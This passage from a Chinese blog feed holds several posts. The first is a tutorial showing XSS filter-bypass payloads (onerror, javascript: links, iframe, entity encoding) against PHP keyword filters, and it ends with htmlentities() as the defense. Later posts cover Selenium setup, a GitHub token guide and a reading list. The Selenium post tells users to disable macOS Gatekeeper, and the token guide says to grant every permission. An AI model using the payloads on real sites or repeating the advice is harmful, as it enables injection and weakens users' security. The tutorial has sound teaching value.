关键字。</p><p>弹框成功！</p><p><img src="https://image.3001.net/images/20191030/1572434447_5db9720fc7d84.png!small"></p><p><strong>0x03、使用 preg_replace() 函数进行正则表达式过滤 script 关键字</strong>  </p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$nickname = preg_replace( &quot;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显然，弹框失败。  </p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg=="><img src="https://image.3001.net/images/20191030/1572434475_5db9722b0f868.png!small"></p><p><strong>攻击者如何再一次绕过？</strong></p><p><strong>答案是：用 img 标签的 oneerror 属性</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04、过滤-alert-关键字"><a href="#0x04、过滤-alert-关键字" class="headerlink" title="0x04、过滤 alert 关键字"></a><strong>0x04、过滤 alert 关键字</strong></h2><p>看到这里，不知道你烦了没有，以开发的角度来讲，我都有点烦。大黑阔你不是喜欢弹窗么？我过滤 alert 关键字看你怎么弹！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$nickname = preg_replace( &quot;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称</span><br><span class="line">$nickname = preg_replace( &quot;(.*)a(.*)l(.*)e(.*)r(.*)t/i&quot;, &quot;&quot;, $nickname);//昵称</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>那么，攻击者该怎么办呢？</strong></p><p><strong>答案是：编码绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(1)&gt;a&lt;/a&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当点击页面上的超链接时，会弹框。  </p><p><img src="https://image.3001.net/images/20191030/1572434515_5db97253eb00b.png!small"></p><p>但是为什么呢？  </p><p>这种编码方式为<strong>字符编码</strong></p><p><strong>字符编码</strong>：十进制、十六进制 ASCII 码或 unicode 字符编码，样式为 “&amp;#数值;”, 例如 “j” 可以编码为 “&#106;” 或 “&#x6a; ”</p><p>上述代码解码之后如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(1)&gt;a&lt;/a&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>你能明显感觉到限制：由于使用到了 a 标签，所以只有点击时，才会弹框。  </p><p>作为一个大黑阔，我们当然是不满意的，能不能让所有进入这个页面的人都弹框？</p><p>当然可以了：<strong>用 iframe 标签编码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert(1)&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种写法，同样既没有 script 关键字，又没有 alert 关键字。  </p><p><img src="https://image.3001.net/images/20191030/1572434557_5db9727d19945.png!small"></p><p>可以看到弹框成功！  </p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg=="><img src="https://image.3001.net/images/20191030/1572434581_5db972950d3e7.png!small"></p><p>可是你也能看到，由于使用了 iframe 标签，留言板的样式已经变形了。实战中尽量不要用。</p><h2 id="0x05、过滤特殊字符"><a href="#0x05、过滤特殊字符" class="headerlink" title="0x05、过滤特殊字符"></a><strong>0x05、过滤特殊字符</strong></h2><p>优秀的开发，永不认输！你个小小的黑阔，不就是会插入 js 代码么？我过滤特殊字符，看你代码咋被解析？</p><p>可是我不想手撸代码来列举那么多特殊字符怎么办？</p><p>php 给我们提供了 htmlentities() 函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$nickname = htmlentities(@$_POST[&#x27;nickname&#x27;]);//昵称</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>htmlentities() 函数的作用是把字符转换为 HTML 实体。</p><table><colgroup><col width="24%"><col width="24%"><col width="25%"><col width="25%"></colgroup><thead><tr><th>显示结果</th><th>描述</th><th>实体名称</th><th>实体编号</th></tr></thead><tbody><tr><td>&nbsp;</td><td>空格</td><td>&amp;nbsp;</td><td>&amp;#160;</td></tr><tr><td>&lt;</td><td>小于号</td><td>&amp;lt;</td><td>&amp;#60;</td></tr><tr><td>&gt;</td><td>大于号</td><td>&amp;gt;</td><td>&amp;#62;</td></tr><tr><td>&amp;</td><td>和号</td><td>&amp;amp;</td><td>&amp;#38;</td></tr><tr><td>"</td><td>引号</td><td>&amp;quot;</td><td>&amp;#34;</td></tr><tr><td>'</td><td>撇号&nbsp;</td><td>&amp;apos; (IE 不支持)</td><td>&amp;#39;</td></tr><tr><td>￠</td><td>分（cent）</td><td>&amp;cent;</td><td>&amp;#162;</td></tr><tr><td>£</td><td>镑（pound）</td><td>&amp;pound;</td><td>&amp;#163;</td></tr><tr><td>¥</td><td>元（yen）</td><td>&amp;yen;</td><td>&amp;#165;</td></tr><tr><td>€</td><td>欧元（euro）</td><td>&amp;euro;</td><td>&amp;#8364;</td></tr><tr><td>§</td><td>小节</td><td>&amp;sect;</td><td>&amp;#167;</td></tr><tr><td>©</td><td>版权（copyright）</td><td>&amp;copy;</td><td>&amp;#169;</td></tr><tr><td>®</td><td>注册商标</td><td>&amp;reg;</td><td>&amp;#174;</td></tr><tr><td>™</td><td>商标</td><td>&amp;trade;</td><td>&amp;#8482;</td></tr><tr><td>×</td><td>乘号</td><td>&amp;times;</td><td>&amp;#215;</td></tr><tr><td>÷</td><td>除号</td><td>&amp;divide;</td><td>&amp;#247;</td></tr></tbody></table><p>看到这里，你可能还是不明白 HTML 字符实体是什么。我举个例子吧，当你想在 HTML 页面上显示一个小于号（&lt;）时，浏览器会认为这是标签的一部分（因为所有标签都由大于号，标签名和小于号构成），因此，为了能在页面上显示这个小于号（&lt;），我们引入了 HTML 字符实体的概念，能够在页面上显示类似于小于号（&lt;）这样的特殊符号，而不会影响到页面标签的解析。</p><p>可以看到，我们输入的内容全部显示在页面上了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg=="><img src="https://image.3001.net/images/20191030/1572434614_5db972b65c4b4.png!small"></p><p>可是却没有弹框。</p><p>我们鼠标右键，查看网页源代码：</p><p><img src="https://image.3001.net/images/20191030/1572434641_5db972d1c4f98.png!small"></p><p>实际上，我们输入的内容已经变成了 HTML 实体：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>无法被解析为 js 脚本。</p><p>黑客在当前场景下已经无法攻击了（在某些其他场景，即使使用了 htmlentities() 函数，仍然是可以攻击的，这就不在本文讨论范围之内了）</p><h2 id="0x06、总结"><a href="#0x06、总结" class="headerlink" title="0x06、总结"></a><strong>0x06、总结</strong></h2><p>开发者不应该只考虑关键字的过滤，还应该考虑特殊符号的过滤 。</p><p>黑客在面对未知的情况时，要不断尝试，这对于知识的储备量有较高的要求。</p><p>对于 xss 攻击，站在开发者角度来讲，仅仅用一个 htmlentities() 函数基本可以做到防御，可是一个优秀的开发者应该明白它的原理。站在黑客的角度来讲，面对环境的逐步变化，条件的逐步限制，攻击思路灵活变化是对整个职业生涯有益的。</p><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 软件测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac安装Selenium并配置ChromeDriver</title>
      <link href="/2022/06/08/%E5%9C%A8%20Mac%20%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BA%20Selenium%20%E7%8E%AF%E5%A2%83%E5%B9%B6%E9%A9%B1%E5%8A%A8%20Chrome%20%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
      <url>/2022/06/08/%E5%9C%A8%20Mac%20%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BA%20Selenium%20%E7%8E%AF%E5%A2%83%E5%B9%B6%E9%A9%B1%E5%8A%A8%20Chrome%20%E6%B5%8F%E8%A7%88%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>安装 selenium</strong></p><p>打开终端 -&gt;pip 安装（安装命令：pip3 install selenium）</p><p><img src="https://pic3.zhimg.com/v2-4759203385ab83276b8dbe4e92ecbcaa_r.jpg"></p><h3 id="安装浏览器驱动"><a href="#安装浏览器驱动" class="headerlink" title="安装浏览器驱动"></a><strong>安装浏览器驱动</strong></h3><p><strong>ChromeDriver</strong></p><p><strong>1. 查看 Chrome 版本</strong></p><p>打开 chrome，在设置 -&gt; 关于 Chrome</p><p><img src="https://pic3.zhimg.com/v2-61349e803395648bc61e5a7c8b3f3c26_r.jpg"></p><p>查看 Chrome 的版本号。</p><p><img src="https://pic1.zhimg.com/v2-62ad52fef83baa645e320920d4194428_r.jpg"></p><p><strong>2. 查找 Chrome 和 ChromeDriver 的对应关系</strong></p><p>Chrome73 以上版本，ChromeDriver 版本与 Chrome 版本均保持一致；Chrome73 以下版本，可参考以下关系表，查找 ChromeDriver 版本。</p><p><img src="https://pic4.zhimg.com/v2-f2c3ef08ea0052320040d7a3dba83f0b_b.jpg"></p><p><strong>3. 下载对应 ChromeDriver</strong></p><p>打开 ChromeDriver 下载地址：<a href="http://chromedriver.storage.googleapis.com/index.html">http://chromedriver.storage.googleapis.com/index.html</a></p><p>选择对应版本的</p><p><img src="https://pic1.zhimg.com/v2-8594dc3b96aae10657972c66e589e5d8_r.jpg"></p><p><strong>4. ChromeDriver 环境配置</strong></p><p>进入 / usr/local/bin 目录（由于 Mac 该目录是隐藏的，所以可通过快捷键 command+shift+g 打开）</p><p><img src="https://pic1.zhimg.com/v2-ab531c54cccedda33adbccc1139c0550_r.jpg"></p><p>查看 ChromeDriver 版本：chromedriver –version。</p><p><img src="https://pic3.zhimg.com/v2-0a0b09505f938617938f661f097ccbe2_r.jpg"></p><p>注意，能够输出 ChromeDriver 版本即安装成功。</p><p><strong>5. 编写脚本启动 Chrome 浏览器</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 启动Chrome</span><br><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(&#x27;http://www.baidu.com/&#x27;)  # 打开百度</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行脚本，打开百度首页。</p><p><img src="https://pic3.zhimg.com/v2-d369fd6caa4fcf8b254d959e26fec9ea_r.jpg"></p><p>————————————- 此处有坑 ————————————-&gt;</p><p>如果运行脚本，出现如下所示的 chromeDriver 不能运行的提示。</p><p><img src="https://pic3.zhimg.com/v2-d993de6d51a1fdaf463e2806761e6f06_r.jpg"></p><p>解决方案：</p><ol><li> 在电脑中找到终端。</li></ol><p><img src="https://pic3.zhimg.com/v2-26ea4bbccd4a35432db31fac1de9210e_r.jpg"></p><p>2、在弹出的命令提示框中，输入 sudo spctl –master-disable，确定，提示你输入密码，<strong>密码就是你电脑的密码。</strong></p><p><img src="https://pic2.zhimg.com/v2-69391d10c34e2d1654f56cbc85ff0145_r.jpg"></p><p>3、打开系统偏好设置，安全性与隐私里面，找到任何来源。</p><p><img src="https://pic3.zhimg.com/v2-450a770913673b5a43dfdeb2cf6553ea_r.jpg"><img src="https://pic1.zhimg.com/v2-5465351b4782be1180897c121fcd7d08_r.jpg"></p><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 软件测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> selenium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Why’s THE Design一系列关于计算机领域中程序设计决策文章</title>
      <link href="/2022/06/08/Why%E2%80%99s%20THE%20Design%20%E4%B8%80%E7%B3%BB%E5%88%97%E5%85%B3%E4%BA%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%A2%86%E5%9F%9F%E4%B8%AD%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%86%B3%E7%AD%96%E7%9A%84%E6%96%87%E7%AB%A0/"/>
      <url>/2022/06/08/Why%E2%80%99s%20THE%20Design%20%E4%B8%80%E7%B3%BB%E5%88%97%E5%85%B3%E4%BA%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%A2%86%E5%9F%9F%E4%B8%AD%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%86%B3%E7%AD%96%E7%9A%84%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Why’s THE Design 是一系列关于计算机领域中程序设计决策的文章，作者在这个系列的每一篇文章中都会提出一个具体的问题并从不同的角度讨论这种设计的优缺点、对具体实现造成的影响，文章写的非常详细，下面是目录，喜欢的可以前往学习。</p></blockquote><p>Why’s THE Design 是一系列关于计算机领域中程序设计决策的文章，作者在这个系列的每一篇文章中都会提出一个具体的问题并从不同的角度讨论这种设计的优缺点、对具体实现造成的影响，文章写的非常详细，下面是目录，喜欢的可以前往学习。</p><p>Why’s THE Design：<a href="https://www.ahhhhfs.com/go?_=59beea8166aHR0cHM6Ly9kcmF2ZW4uY28vd2h5cy10aGUtZGVzaWduLw==">https://draven.co/whys-the-design/</a></p><h3 id="按分类组织"><a href="#按分类组织" class="headerlink" title="按分类组织"></a>按分类组织</h3><h4 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h4><ul><li>  001 为什么 TCP 建立连接需要三次握手</li><li>  005 为什么 DNS 使用 UDP 协议</li><li>  012 为什么 TCP 协议有性能问题</li><li>  013 为什么 UDP 头只有 8 个字节</li><li>  017 为什么 TCP/IP 协议会拆分数据</li><li>  018 为什么流媒体直播的延迟很高</li><li>  019 为什么 HTTPS 需要 7 次握手以及 9 倍时延</li><li>  020 为什么 TCP 协议有粘包问题</li><li>  021 为什么 TCP 协议有 TIME_WAIT 状态</li><li>  026 为什么 MAC 地址不需要全球唯一</li><li>  027 为什么 IPv6 难以取代 IPv4</li><li>  028 为什么集群需要 Overlay 网络</li></ul><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><ul><li>  003 为什么 Redis 选择单线程模型</li><li>  009 为什么 MySQL 使用 B+ 树</li><li>  010 为什么 Redis 快照使用子进程</li><li>  011 为什么 MongoDB 使用 B 树</li><li>  015 为什么数据库会丢失数据</li><li>  016 为什么比特币可以防篡改</li><li>  024 为什么 MySQL 的自增主键不单调也不连续</li><li>  031 为什么数据库不应该使用外键</li><li>  036 为什么 OLAP 需要列式存储</li></ul><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><ul><li>  023 为什么 Linux 需要虚拟内存</li><li>  029 为什么系统调用会消耗较多资源</li><li>  030 为什么 Linux 默认页大小是 4KB</li><li>  032 为什么 CPU 访问硬盘很慢</li><li>  033 为什么 NUMA 会影响程序的延迟</li><li>  034 为什么 HugePages 可以提升数据库性能</li><li>  035 为什么 Linux 需要 Swapping</li><li>  038 为什么早期的 Windows 需要整理碎片</li><li>  039 为什么 Linux 和 macOS 不需要碎片整理</li></ul><h4 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h4><ul><li>  014 为什么 Go 语言没有泛型</li></ul><h4 id="软件工程"><a href="#软件工程" class="headerlink" title="软件工程"></a>软件工程</h4><ul><li><p>002 为什么使用通信来共享内存</p></li><li><p>004 为什么你应该使用 Git 进行版本控制</p></li><li><p>006 为什么使用 MD5 存储密码非常危险</p></li><li><p>007 为什么基础服务不应该高可用</p></li><li><p>008 为什么总是需要无意义的 ID</p></li><li><p>018 为什么流媒体直播的延迟很高</p></li><li><p>022 为什么 0.1 + 0.2 = 0.300000004</p></li><li><p>025 为什么 0.1 + 0.2 = 0.3</p></li><li><p>037 为什么 Kubernetes 要替换 Docker</p></li><li><p>本站所有资源文章出自互联网收集整理，本站不参与制作，如果侵犯了您的合法权益，请联系本站我们会及时删除。</p></li><li><p>  本站资源仅供研究、学习交流之用，若使用商业用途，请购买正版授权，否则产生的一切后果将由下载用户自行承担。</p></li></ul><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 资源 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习资源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github获取token</title>
      <link href="/2022/06/07/github%20%E8%8E%B7%E5%8F%96%20token/"/>
      <url>/2022/06/07/github%20%E8%8E%B7%E5%8F%96%20token/</url>
      
        <content type="html"><![CDATA[<p>github图床需要GitHub 的token，下面将获取 token 的过程记录一下：</p><p>1、在 <a href="https://github.com/">https://github.com</a> 登录你的帐号，登录以后点击右上角你的头像的 Settings</p><p><img src="https://img-blog.csdn.net/20170217152157588">  </p><p>2、 点击 Developer settings 下的 Personal access tokens</p><p><img src="https://img-blog.csdn.net/20170217152349105">  </p><p>如果您老人家觉得上面两个步骤很麻烦，那么您就直接进入这个链接 (前提是你要先登陆你的帐号)：<a href="https://github.com/settings/tokens">https://github.com/settings/tokens</a></p><p>3、点击 <a href="https://github.com/settings/tokens/new">https://github.com/settings/tokens/new</a> 这个超链接，就是创建你的 token。</p><p><img src="https://img-blog.csdn.net/20170217152710967">  </p><p>4、在 Token description 中随便填一个描述名称，下面的复选框是你这个 token 需要的权限，全部勾上就可以了。</p><p><img src="https://img-blog.csdn.net/20170217152936623">  </p><p>然后点击下面这个绿色的按钮：</p><p><img src="https://img-blog.csdn.net/20170217153021654">  </p><p>5、下面这个就是你的 token 了，可以直接复制使用。</p><p><img src="https://img-blog.csdn.net/20170217153116404">  </p><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>selenium Python教程</title>
      <link href="/2022/06/06/Selenium%20Python%20%E6%95%99%E7%A8%8B/"/>
      <url>/2022/06/06/Selenium%20Python%20%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>Selenium 是一个用电脑模拟人操作浏览器网页，可以实现自动化，测试等！废话不多说，直接干！</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li> 安装<code>seleniumm</code></li></ol><p><code>pip install selenium</code></p><ol start="2"><li>下载浏览器驱动</li></ol><p>Firefox 浏览器驱动：<a href="https://github.com/mozilla/geckodriver/releases">geckodriver</a></p><p>Chrome 浏览器驱动：<a href="https://sites.google.com/a/chromium.org/chromedriver/home">chromedriver</a> ,<a href="https://registry.npmmirror.com/binary.html?path=chromedriver/">CNPM Binaries Mirror (npmmirror.com)</a>， <a href="https://npm.taobao.org/mirrors/chromedriver">taobao 备用地址</a></p><p>IE 浏览器驱动：<a href="http://selenium-release.storage.googleapis.com/index.html">IEDriverServer</a></p><p>Edge 浏览器驱动：<a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver">MicrosoftWebDriver</a></p><p>Opera 浏览器驱动：<a href="https://github.com/operasoftware/operachromiumdriver/releases">operadriver</a></p><p>PhantomJS 浏览器驱动：<a href="http://phantomjs.org/">phantomjs</a></p><p><strong>需要把浏览器驱动放入系统路径中，或者直接告知 selenuim 的驱动路径</strong></p><p>另外启动浏览器，可以设置一些参数，比如无界面之类的，详细参考：</p><blockquote><p>补充上面一个参数，添加代理：options.add_argument(“–proxy-server=<a href="http://xxxxx.com/">http://XXXXX.com:80</a>“)</p></blockquote><p>可以测试是否正常使用，以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">driver = webdriver.Firefox()   # Firefox浏览器</span><br><span class="line"># driver = webdriver.Firefox(&quot;驱动路径&quot;)</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()    # Chrome浏览器</span><br><span class="line"></span><br><span class="line">driver = webdriver.Ie()        # Internet Explorer浏览器</span><br><span class="line"></span><br><span class="line">driver = webdriver.Edge()      # Edge浏览器</span><br><span class="line"></span><br><span class="line">driver = webdriver.Opera()     # Opera浏览器</span><br><span class="line"></span><br><span class="line">driver = webdriver.PhantomJS()   # PhantomJS</span><br><span class="line"></span><br><span class="line"># 打开网页</span><br><span class="line">driver.get(url) # 打开url网页 比如 driver.get(&quot;http://www.baidu.com&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2021 年 6 月 27 日 补充</strong></p><p>用<code>selenium</code> 登录新版的<code>edge</code>方法</p><p>首先，安装<code>pip install msedge-selenium-tools</code></p><p>接下来，使用以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from msedge.selenium_tools import Edge, EdgeOptions</span><br><span class="line">options = EdgeOptions()</span><br><span class="line">options.use_chromium = True</span><br><span class="line">options.binary_location = r&quot;C:\xx\Microsoft\EdgeCore\93.0.926.0\msedge.exe&quot; # 浏览器的位置</span><br><span class="line">driver = Edge(options=options, executable_path=r&quot;D:\xx\Desktop\edgedriver_win64\msedgedriver.exe&quot;) # 相应的浏览器的驱动位置</span><br><span class="line">​</span><br><span class="line">driver.get(&quot;http://www.baidu.com&quot;)</span><br><span class="line">​</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="元素定位"><a href="#元素定位" class="headerlink" title="元素定位"></a>元素定位</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find_element_by_id()</span><br><span class="line">find_element_by_name()</span><br><span class="line">find_element_by_class_name()</span><br><span class="line">find_element_by_tag_name()</span><br><span class="line">find_element_by_link_text()</span><br><span class="line">find_element_by_partial_link_text()</span><br><span class="line">find_element_by_xpath()</span><br><span class="line">find_element_by_css_selector()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>element</code>变成<code>elements</code>就是找所有满足的条件，返回数组。</p><p>一般我都自己采用 <strong>xpath</strong> 获取元素的，复制即可</p><p><img src="https://pic2.zhimg.com/v2-50358e3d06ae71dcfad7c9c45e3d73b9_r.jpg"></p><p>关于获取对象的 api 查找：</p><h2 id="控制浏览器操作"><a href="#控制浏览器操作" class="headerlink" 